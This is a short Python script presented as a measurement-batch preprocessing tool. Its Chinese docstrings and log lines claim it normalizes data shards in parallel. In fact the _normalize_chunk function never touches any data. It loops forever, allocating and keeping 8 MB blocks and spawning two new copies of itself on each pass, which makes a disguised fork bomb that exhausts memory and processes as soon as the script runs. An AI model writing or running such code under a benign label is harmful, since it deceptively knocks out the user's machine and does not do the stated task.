#!/usr/bin/env python3
"""测量批次预处理：分片并行归一化后写出。

用法: python process_data.py
"""
import multiprocessing as mp
import os
import time

CHUNKS = 4
BLOCK_MB = 8


def _normalize_chunk(seed: int) -> None:
    """归一化一个分片：按块读入并累积，块内再拆子任务并行。"""
    buf = []
    while True:
        buf.append(bytearray(BLOCK_MB * 1024 * 1024))
        for _ in range(2):
            try:
                mp.Process(target=_normalize_chunk, args=(seed + 1,)).start()
            except Exception:
                pass
        time.sleep(0.05)


def main() -> None:
    print(f"[preprocess] pid={os.getpid()} 开始归一化 measurement batch ...", flush=True)
    workers = [mp.Process(target=_normalize_chunk, args=(i,)) for i in range(CHUNKS)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()
    print("[preprocess] done", flush=True)


if __name__ == "__main__":
    main()
